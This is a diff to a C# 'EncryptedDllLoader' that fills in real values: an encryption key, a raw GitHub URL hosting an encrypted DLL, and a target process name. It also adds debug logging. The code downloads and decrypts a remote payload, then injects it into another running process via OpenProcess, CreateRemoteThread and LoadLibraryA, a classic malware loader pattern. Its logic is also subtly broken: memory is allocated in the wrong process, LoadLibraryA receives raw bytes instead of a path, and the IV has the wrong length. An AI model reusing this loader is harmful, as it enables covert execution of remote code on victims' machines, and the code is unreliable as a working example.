@@ -9,32 +9,32 @@ using System.Threading;
 
 public class EncryptedDllLoader
 {
-    private static readonly string Key = "YourEncryptionKey"; // Replace with a strong secret key
-    private static readonly string IV = "1234567890123456";    // Replace with a strong initialization vector
+    private static readonly string Key = "70ebd74adcc74271"; // Replace with a strong secret key
+    private static readonly string IV = "userthreadingmainfunction"; // Replace with a strong initialization vector
 
-    private static readonly string DllUrl = "https://example.com/your_encrypted_dll.dll"; // Replace with the actual URL
+    private static readonly string DllUrl = "https://raw.githubusercontent.com/99119240/Methods/main/dll/gui.dll.encrypted"; // Replace with the actual URL
 
     public static void Main()
     {
         try
         {
-            // Download the encrypted DLL
+            Console.WriteLine("[Debug] Downloading the encrypted DLL...");
             byte[] encryptedDllBytes = DownloadFile(DllUrl);
 
-            // Decrypt the DLL
+            Console.WriteLine("[Debug] Decrypting the DLL...");
             byte[] decryptedDllBytes = Decrypt(encryptedDllBytes, Key, IV);
 
-            // Load the decrypted DLL into memory
+            Console.WriteLine("[Debug] Loading the decrypted DLL into memory...");
             IntPtr dllMemoryAddress = LoadDllIntoMemory(decryptedDllBytes);
 
-            // Wait for the target process
-            string targetProcessName = "TargetProcess.exe"; // Replace with the name of your target process
+            Console.WriteLine("[Debug] Waiting for the target process...");
+            string targetProcessName = "GFXTest64.exe"; // Replace with the name of your target process
             WaitForTargetProcess(targetProcessName);
 
-            // Get the target process ID
+            Console.WriteLine("[Debug] Getting the target process ID...");
             int targetProcessId = GetProcessIdByName(targetProcessName);
 
-            // Inject the DLL into the target process
+            Console.WriteLine("[Debug] Injecting the DLL into the target process...");
             if (targetProcessId != -1)
             {
                 InjectDllIntoProcess(targetProcessId, dllMemoryAddress);
@@ -86,10 +86,8 @@ public class EncryptedDllLoader
     {
         IntPtr processHandle = GetCurrentProcessHandle();
 
-        // Allocate memory for the DLL
         IntPtr dllMemoryAddress = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)dllBytes.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
 
-        // Write the DLL into the allocated memory
         WriteProcessMemory(processHandle, dllMemoryAddress, dllBytes, (uint)dllBytes.Length, out _);
 
         return dllMemoryAddress;
@@ -118,23 +116,25 @@ public class EncryptedDllLoader
     {
         IntPtr processHandle = OpenProcess(ProcessAccessFlags.All, false, processId);
 
-        // Get the address of the LoadLibraryA function in kernel32.dll
+        Console.WriteLine("[Debug] Getting the address of the LoadLibraryA function in kernel32.dll...");
         IntPtr loadLibraryAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
 
-        // Create a remote thread to call LoadLibraryA with the DLL path
+        Console.WriteLine("[Debug] Creating a remote thread to call LoadLibraryA with the DLL path...");
         IntPtr thread = CreateRemoteThread(processHandle, IntPtr.Zero, 0, loadLibraryAddress, dllMemoryAddress, 0, IntPtr.Zero);
 
-        // Wait for the remote thread to finish
+        Console.WriteLine("[Debug] Waiting for the remote thread to finish...");
         WaitForSingleObject(thread, 0xFFFFFFFF);
 
-        // Close the handle to the remote thread
+        Console.WriteLine("[Debug] Closing the handle to the remote thread...");
         CloseHandle(thread);
 
-        // Free the memory allocated for the DLL in the target process
+        Console.WriteLine("[Debug] Freeing the memory allocated for the DLL in the target process...");
         VirtualFreeEx(processHandle, dllMemoryAddress, 0, AllocationType.Release);
 
-        // Close the handle to the target process
+        Console.WriteLine("[Debug] Closing the handle to the target process...");
         CloseHandle(processHandle);
+
+        Console.WriteLine("[Debug] DLL injection complete.");
     }
 
     [DllImport("kernel32.dll", SetLastError = true)]
